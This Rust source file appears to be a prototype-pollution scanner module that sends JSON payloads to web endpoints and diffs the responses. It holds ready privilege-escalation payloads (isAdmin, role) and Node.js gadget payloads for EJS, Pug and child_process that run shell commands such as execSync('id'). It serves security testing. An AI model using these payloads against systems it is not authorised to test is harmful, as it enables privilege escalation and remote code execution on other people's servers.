use std::collections::HashMap;

/// Injection vector categories for prototype pollution payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum InjectionPattern {
    /// Direct `__proto__` key at top level
    DirectProto,
    /// `constructor.prototype` traversal
    ConstructorPrototype,
    /// Nested merge path — pollution buried inside object hierarchy
    NestedMerge,
    /// Array index combined with `__proto__`
    ArrayProto,
    /// Bracket notation bypass (`__pro__` + `to__` concatenation style keys)
    BracketBypass,
}

impl InjectionPattern {
    pub fn all() -> &'static [InjectionPattern] {
        &[
            InjectionPattern::DirectProto,
            InjectionPattern::ConstructorPrototype,
            InjectionPattern::NestedMerge,
            InjectionPattern::ArrayProto,
            InjectionPattern::BracketBypass,
        ]
    }

    pub fn label(&self) -> &'static str {
        match self {
            InjectionPattern::DirectProto => "direct_proto",
            InjectionPattern::ConstructorPrototype => "constructor_prototype",
            InjectionPattern::NestedMerge => "nested_merge",
            InjectionPattern::ArrayProto => "array_proto",
            InjectionPattern::BracketBypass => "bracket_bypass",
        }
    }
}

/// A single pollution payload ready for injection.
#[derive(Debug, Clone)]
pub struct PollutionPayload {
    pub json_body: String,
    pub pattern: InjectionPattern,
    pub description: String,
    pub polluted_key: String,
    pub polluted_value: String,
}

/// Known Node.js gadget chain type for post-pollution exploitation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum GadgetType {
    /// child_process.spawn/exec via env or shell override
    ChildProcessRce,
    /// EJS template RCE via outputFunctionName
    EjsTemplateRce,
    /// Pug template RCE via block.type
    PugTemplateRce,
    /// Handlebars RCE via allowProtoMethodsByDefault
    HandlebarsTemplateRce,
    /// Express status code override via __proto__.status
    ExpressStatusOverride,
    /// HTTP header injection via __proto__.headers
    HttpHeaderInjection,
    /// JSON.parse reviver manipulation
    JsonParserGadget,
}

impl GadgetType {
    pub fn all() -> &'static [GadgetType] {
        &[
            GadgetType::ChildProcessRce,
            GadgetType::EjsTemplateRce,
            GadgetType::PugTemplateRce,
            GadgetType::HandlebarsTemplateRce,
            GadgetType::ExpressStatusOverride,
            GadgetType::HttpHeaderInjection,
            GadgetType::JsonParserGadget,
        ]
    }

    pub fn severity(&self) -> f64 {
        match self {
            GadgetType::ChildProcessRce => 10.0,
            GadgetType::EjsTemplateRce => 9.8,
            GadgetType::PugTemplateRce => 9.8,
            GadgetType::HandlebarsTemplateRce => 9.5,
            GadgetType::HttpHeaderInjection => 8.0,
            GadgetType::ExpressStatusOverride => 7.0,
            GadgetType::JsonParserGadget => 6.5,
        }
    }

    pub fn label(&self) -> &'static str {
        match self {
            GadgetType::ChildProcessRce => "child_process_rce",
            GadgetType::EjsTemplateRce => "ejs_template_rce",
            GadgetType::PugTemplateRce => "pug_template_rce",
            GadgetType::HandlebarsTemplateRce => "handlebars_template_rce",
            GadgetType::ExpressStatusOverride => "express_status_override",
            GadgetType::HttpHeaderInjection => "http_header_injection",
            GadgetType::JsonParserGadget => "json_parser_gadget",
        }
    }
}

/// Gadget verification payload: the pollution payload plus the expected signal.
#[derive(Debug, Clone)]
pub struct GadgetPayload {
    pub gadget_type: GadgetType,
    pub pollution_json: String,
    pub verification_signal: VerificationSignal,
    pub description: String,
}

/// What to look for in the response to confirm the gadget fired.
#[derive(Debug, Clone)]
pub enum VerificationSignal {
    StatusCodeChange(u16),
    HeaderPresent {
        name: String,
        value_contains: String,
    },
    BodyContains(String),
    BodyRegex(String),
    StatusCodeRange {
        min: u16,
        max: u16,
    },
}

/// Captures the difference between a clean baseline response and a polluted one.
#[derive(Debug, Clone)]
pub struct ResponseDiff {
    pub status_changed: bool,
    pub baseline_status: u16,
    pub polluted_status: u16,
    pub new_headers: Vec<(String, String)>,
    pub removed_headers: Vec<String>,
    pub body_length_delta: i64,
    pub body_content_changed: bool,
    pub new_body_tokens: Vec<String>,
}

/// A confirmed pollution finding with full evidence chain.
#[derive(Debug, Clone)]
pub struct PollutionFinding {
    pub endpoint: String,
    pub method: String,
    pub payload: PollutionPayload,
    pub gadget: Option<GadgetType>,
    pub severity: f64,
    pub evidence: String,
    pub diff: ResponseDiff,
}

/// Lightweight representation of an HTTP response for diffing.
#[derive(Debug, Clone)]
pub struct ResponseSnapshot {
    pub status_code: u16,
    pub headers: Vec<(String, String)>,
    pub body: String,
}

const BODY_ACCEPTING_METHODS: &[&str] = &["POST", "PUT", "PATCH", "DELETE", "MERGE"];

const SENTINEL_KEY: &str = "aegis_pp_canary";
const SENTINEL_VALUE: &str = "polluted_42";

pub struct PrototypePollutionTester;

impl PrototypePollutionTester {
    /// Generate all pollution payloads across every injection pattern.
    pub fn generate_payloads() -> Vec<PollutionPayload> {
        let mut payloads = Vec::with_capacity(20);

        // --- DirectProto pattern ---
        payloads.push(PollutionPayload {
            json_body: format!(r#"{{"__proto__": {{"{SENTINEL_KEY}": "{SENTINEL_VALUE}"}}}}"#),
            pattern: InjectionPattern::DirectProto,
            description: "Direct __proto__ canary injection".into(),
            polluted_key: SENTINEL_KEY.into(),
            polluted_value: SENTINEL_VALUE.into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"__proto__": {"isAdmin": true}}"#.into(),
            pattern: InjectionPattern::DirectProto,
            description: "Direct __proto__ privilege escalation (isAdmin)".into(),
            polluted_key: "isAdmin".into(),
            polluted_value: "true".into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"__proto__": {"role": "admin"}}"#.into(),
            pattern: InjectionPattern::DirectProto,
            description: "Direct __proto__ role override".into(),
            polluted_key: "role".into(),
            polluted_value: "admin".into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"__proto__": {"status": 500}}"#.into(),
            pattern: InjectionPattern::DirectProto,
            description: "Direct __proto__ status code override".into(),
            polluted_key: "status".into(),
            polluted_value: "500".into(),
        });

        // --- ConstructorPrototype pattern ---
        payloads.push(PollutionPayload {
            json_body: format!(
                r#"{{"constructor": {{"prototype": {{"{SENTINEL_KEY}": "{SENTINEL_VALUE}"}}}}}}"#
            ),
            pattern: InjectionPattern::ConstructorPrototype,
            description: "Constructor.prototype canary injection".into(),
            polluted_key: SENTINEL_KEY.into(),
            polluted_value: SENTINEL_VALUE.into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"constructor": {"prototype": {"status": 500}}}"#.into(),
            pattern: InjectionPattern::ConstructorPrototype,
            description: "Constructor.prototype status code pollution".into(),
            polluted_key: "status".into(),
            polluted_value: "500".into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"constructor": {"prototype": {"admin": true}}}"#.into(),
            pattern: InjectionPattern::ConstructorPrototype,
            description: "Constructor.prototype admin escalation".into(),
            polluted_key: "admin".into(),
            polluted_value: "true".into(),
        });

        // --- NestedMerge pattern ---
        payloads.push(PollutionPayload {
            json_body: format!(
                r#"{{"a": {{"__proto__": {{"{SENTINEL_KEY}": "{SENTINEL_VALUE}"}}}}}}"#
            ),
            pattern: InjectionPattern::NestedMerge,
            description: "Nested merge __proto__ canary (depth=1)".into(),
            polluted_key: SENTINEL_KEY.into(),
            polluted_value: SENTINEL_VALUE.into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"a": {"__proto__": {"polluted": true}}}"#.into(),
            pattern: InjectionPattern::NestedMerge,
            description: "Nested merge __proto__ boolean pollution".into(),
            polluted_key: "polluted".into(),
            polluted_value: "true".into(),
        });
        payloads.push(PollutionPayload {
            json_body: format!(
                r#"{{"config": {{"settings": {{"__proto__": {{"{SENTINEL_KEY}": "{SENTINEL_VALUE}"}}}}}}}}"#
            ),
            pattern: InjectionPattern::NestedMerge,
            description: "Nested merge __proto__ canary (depth=2)".into(),
            polluted_key: SENTINEL_KEY.into(),
            polluted_value: SENTINEL_VALUE.into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"data": {"constructor": {"prototype": {"isAdmin": true}}}}"#.into(),
            pattern: InjectionPattern::NestedMerge,
            description: "Nested constructor.prototype escalation".into(),
            polluted_key: "isAdmin".into(),
            polluted_value: "true".into(),
        });

        // --- ArrayProto pattern ---
        payloads.push(PollutionPayload {
            json_body: format!(
                r#"{{"items": [{{"__proto__": {{"{SENTINEL_KEY}": "{SENTINEL_VALUE}"}}}}]}}"#
            ),
            pattern: InjectionPattern::ArrayProto,
            description: "Array element __proto__ pollution".into(),
            polluted_key: SENTINEL_KEY.into(),
            polluted_value: SENTINEL_VALUE.into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"items": [{"__proto__": {"isAdmin": true}}]}"#.into(),
            pattern: InjectionPattern::ArrayProto,
            description: "Array element __proto__ privilege escalation".into(),
            polluted_key: "isAdmin".into(),
            polluted_value: "true".into(),
        });

        // --- BracketBypass pattern ---
        payloads.push(PollutionPayload {
            json_body: format!(r#"{{"__proto__[{SENTINEL_KEY}]": "{SENTINEL_VALUE}"}}"#),
            pattern: InjectionPattern::BracketBypass,
            description: "Bracket notation __proto__ bypass".into(),
            polluted_key: SENTINEL_KEY.into(),
            polluted_value: SENTINEL_VALUE.into(),
        });
        payloads.push(PollutionPayload {
            json_body: r#"{"__proto__[isAdmin]": "true"}"#.into(),
            pattern: InjectionPattern::BracketBypass,
            description: "Bracket notation __proto__ isAdmin bypass".into(),
            polluted_key: "isAdmin".into(),
            polluted_value: "true".into(),
        });
        payloads.push(PollutionPayload {
            json_body: format!(
                r#"{{"constructor[prototype][{SENTINEL_KEY}]": "{SENTINEL_VALUE}"}}"#
            ),
            pattern: InjectionPattern::BracketBypass,
            description: "Bracket notation constructor.prototype bypass".into(),
            polluted_key: SENTINEL_KEY.into(),
            polluted_value: SENTINEL_VALUE.into(),
        });

        payloads
    }

    /// Filter payloads to only those matching the given endpoint's HTTP method.
    pub fn payloads_for_method(method: &str) -> Vec<PollutionPayload> {
        if !BODY_ACCEPTING_METHODS
            .iter()
            .any(|m| m.eq_ignore_ascii_case(method))
        {
            return Vec::new();
        }
        Self::generate_payloads()
    }

    /// Analyze paired baseline/polluted responses to detect pollution signals.
    pub fn analyze_diff(baseline: &ResponseSnapshot, polluted: &ResponseSnapshot) -> ResponseDiff {
        let baseline_headers: HashMap<String, String> = baseline
            .headers
            .iter()
            .map(|(k, v)| (k.to_lowercase(), v.clone()))
            .collect();

        let polluted_headers: HashMap<String, String> = polluted
            .headers
            .iter()
            .map(|(k, v)| (k.to_lowercase(), v.clone()))
            .collect();

        let new_headers: Vec<(String, String)> = polluted_headers
            .iter()
            .filter(|(k, _)| !baseline_headers.contains_key(k.as_str()))
            .map(|(k, v)| (k.clone(), v.clone()))
            .collect();

        let removed_headers: Vec<String> = baseline_headers
            .keys()
            .filter(|k| !polluted_headers.contains_key(k.as_str()))
            .cloned()
            .collect();

        let baseline_tokens = tokenize_body(&baseline.body);
        let polluted_tokens = tokenize_body(&polluted.body);
        let new_body_tokens: Vec<String> = polluted_tokens
            .into_iter()
            .filter(|t| !baseline_tokens.contains(t))
            .collect();

        ResponseDiff {
            status_changed: baseline.status_code != polluted.status_code,
            baseline_status: baseline.status_code,
            polluted_status: polluted.status_code,
            new_headers,
            removed_headers,
            body_length_delta: polluted.body.len() as i64 - baseline.body.len() as i64,
            body_content_changed: baseline.body != polluted.body,
            new_body_tokens,
        }
    }

    /// Determine whether a diff indicates likely prototype pollution.
    pub fn is_pollution_detected(diff: &ResponseDiff, payload: &PollutionPayload) -> bool {
        if diff.status_changed {
            return true;
        }
        if !diff.new_headers.is_empty() {
            return true;
        }
        if diff
            .new_body_tokens
            .iter()
            .any(|t| t.contains(&payload.polluted_key) || t.contains(&payload.polluted_value))
        {
            return true;
        }
        if diff.body_content_changed && diff.body_length_delta.abs() > 10 {
            return true;
        }
        false
    }

    /// Score pollution severity based on the diff and payload characteristics.
    pub fn score_severity(diff: &ResponseDiff, payload: &PollutionPayload) -> f64 {
        let mut score: f64 = 5.0;

        if diff.status_changed {
            score += 2.0;
        }
        if !diff.new_headers.is_empty() {
            score += 1.5;
        }
        if diff.new_body_tokens.iter().any(|t| t.contains("admin")) {
            score += 2.0;
        }
        if payload.polluted_key == "isAdmin"
            || payload.polluted_key == "role"
            || payload.polluted_key == "admin"
        {
            score += 1.5;
        }
        if payload.pattern == InjectionPattern::ConstructorPrototype
            || payload.pattern == InjectionPattern::NestedMerge
        {
            score += 0.5;
        }

        score.min(10.0)
    }

    /// Run the full test suite against an endpoint: generate payloads, analyze diffs, produce findings.
    pub fn test_endpoint(
        endpoint: &str,
        method: &str,
        baseline: &ResponseSnapshot,
        polluted_responses: &[(PollutionPayload, ResponseSnapshot)],
    ) -> Vec<PollutionFinding> {
        polluted_responses
            .iter()
            .filter_map(|(payload, response)| {
                let diff = Self::analyze_diff(baseline, response);
                if Self::is_pollution_detected(&diff, payload) {
                    let severity = Self::score_severity(&diff, payload);
                    let evidence = build_evidence(endpoint, method, &diff, payload);
                    Some(PollutionFinding {
                        endpoint: endpoint.into(),
                        method: method.into(),
                        payload: payload.clone(),
                        gadget: None,
                        severity,
                        evidence,
                        diff,
                    })
                } else {
                    None
                }
            })
            .collect()
    }
}

pub struct GadgetVerifier;

impl GadgetVerifier {
    /// Generate gadget verification payloads for all known chains.
    pub fn gadget_payloads() -> Vec<GadgetPayload> {
        vec![
            // 1. child_process RCE via env pollution
            GadgetPayload {
                gadget_type: GadgetType::ChildProcessRce,
                pollution_json: r#"{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log('rce')", "env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}"#.into(),
                verification_signal: VerificationSignal::BodyContains("rce".into()),
                description: "child_process RCE via NODE_OPTIONS env pollution".into(),
            },
            // 2. EJS template RCE via outputFunctionName
            GadgetPayload {
                gadget_type: GadgetType::EjsTemplateRce,
                pollution_json: r#"{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}"#.into(),
                verification_signal: VerificationSignal::BodyRegex(r"uid=\d+".into()),
                description: "EJS RCE via outputFunctionName gadget".into(),
            },
            // 3. Pug template RCE via block.type
            GadgetPayload {
                gadget_type: GadgetType::PugTemplateRce,
                pollution_json: r#"{"__proto__": {"block": {"type": "Text", "val": "x]});process.mainModule.require('child_process').execSync('id');//"}}}"#.into(),
                verification_signal: VerificationSignal::BodyRegex(r"uid=\d+".into()),
                description: "Pug RCE via block.type prototype pollution".into(),
            },
            // 4. Handlebars RCE via allowProtoMethodsByDefault
            GadgetPayload {
                gadget_type: GadgetType::HandlebarsTemplateRce,
                pollution_json: r#"{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}"#.into(),
                verification_signal: VerificationSignal::BodyContains("allowProtoMethodsByDefault".into()),
                description: "Handlebars proto method access via allowProtoMethodsByDefault".into(),
            },
            // 5. Express status code override
            GadgetPayload {
                gadget_type: GadgetType::ExpressStatusOverride,
                pollution_json: r#"{"__proto__": {"status": 503}}"#.into(),
                verification_signal: VerificationSignal::StatusCodeChange(503),
                description: "Express status code override via __proto__.status".into(),
            },
            // 6. HTTP header injection via __proto__.headers
            GadgetPayload {
                gadget_type: GadgetType::HttpHeaderInjection,
                pollution_json: r#"{"__proto__": {"headers": {"x-polluted": "aegis-canary"}}}"#.into(),
                verification_signal: VerificationSignal::HeaderPresent {
                    name: "x-polluted".into(),
                    value_contains: "aegis-canary".into(),
                },
                description: "HTTP header injection via __proto__.headers".into(),
            },
            // 7. JSON parser gadget via __proto__.toJSON
            GadgetPayload {
                gadget_type: GadgetType::JsonParserGadget,
                pollution_json: r#"{"constructor": {"prototype": {"toJSON": "aegis_canary_toJSON"}}}"#.into(),
                verification_signal: VerificationSignal::BodyContains("aegis_canary_toJSON".into()),
                description: "JSON serialization hijack via toJSON pollution".into(),
            },
        ]
    }

    /// Verify a single gadget payload against a response.
    pub fn verify_gadget(gadget: &GadgetPayload, response: &ResponseSnapshot) -> bool {
        match &gadget.verification_signal {
            VerificationSignal::StatusCodeChange(expected) => response.status_code == *expected,
            VerificationSignal::HeaderPresent {
                name,
                value_contains,
            } => response
                .headers
                .iter()
                .any(|(k, v)| k.eq_ignore_ascii_case(name) && v.contains(value_contains.as_str())),
            VerificationSignal::BodyContains(needle) => response.body.contains(needle.as_str()),
            VerificationSignal::BodyRegex(pattern) => regex::Regex::new(pattern)
                .map(|re| re.is_match(&response.body))
                .unwrap_or(false),
            VerificationSignal::StatusCodeRange { min, max } => {
                response.status_code >= *min && response.status_code <= *max
            }
        }
    }

    /// Run all gadget verifiers against a response, returning confirmed gadget types.
    pub fn verify_all(
        responses: &[(GadgetPayload, ResponseSnapshot)],
    ) -> Vec<(GadgetType, String)> {
        responses
            .iter()
            .filter_map(|(gadget, response)| {
                if Self::verify_gadget(gadget, response) {
                    Some((gadget.gadget_type, gadget.description.clone()))
                } else {
                    None
                }
            })
            .collect()
    }

    /// Produce full findings from gadget verification, building on prior pollution findings.
    pub fn findings_from_gadgets(
        endpoint: &str,
        method: &str,
        baseline: &ResponseSnapshot,
        gadget_responses: &[(GadgetPayload, ResponseSnapshot)],
    ) -> Vec<PollutionFinding> {
        gadget_responses
            .iter()
            .filter_map(|(gadget, response)| {
                if !Self::verify_gadget(gadget, response) {
                    return None;
                }
                let diff = PrototypePollutionTester::analyze_diff(baseline, response);
                Some(PollutionFinding {
                    endpoint: endpoint.into(),
                    method: method.into(),
                    payload: PollutionPayload {
                        json_body: gadget.pollution_json.clone(),
                        pattern: InjectionPattern::DirectProto,
                        description: gadget.description.clone(),
                        polluted_key: format!("gadget:{}", gadget.gadget_type.label()),
                        polluted_value: String::new(),
                    },
                    gadget: Some(gadget.gadget_type),
                    severity: gadget.gadget_type.severity(),
                    evidence: format!(
                        "Confirmed {} gadget on {} {}: {}",
                        gadget.gadget_type.label(),
                        method,
                        endpoint,
                        gadget.description
                    ),
                    diff,
                })
            })
            .collect()
    }
}

fn tokenize_body(body: &str) -> Vec<String> {
    body.split(|c: char| c.is_whitespace() || c == ',' || c == ':' || c == '"')
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string())
        .collect()
}

fn build_evidence(
    endpoint: &str,
    method: &str,
    diff: &ResponseDiff,
    payload: &PollutionPayload,
) -> String {
    let mut parts = vec![format!(
        "Prototype pollution detected on {} {} via {} pattern",
        method,
        endpoint,
        payload.pattern.label()
    )];

    if diff.status_changed {
        parts.push(format!(
            "Status changed: {} → {}",
            diff.baseline_status, diff.polluted_status
        ));
    }
    if !diff.new_headers.is_empty() {
        let header_names: Vec<&str> = diff.new_headers.iter().map(|(k, _)| k.as_str()).collect();
        parts.push(format!("New headers appeared: {}", header_names.join(", ")));
    }
    if diff.body_content_changed {
        parts.push(format!(
            "Body changed (delta {} bytes)",
            diff.body_length_delta
        ));
    }
    if !diff.new_body_tokens.is_empty() {
        let sample: Vec<&str> = diff
            .new_body_tokens
            .iter()
            .take(5)
            .map(|s| s.as_str())
            .collect();
        parts.push(format!("New tokens in body: {}", sample.join(", ")));
    }

    parts.join(". ")
}
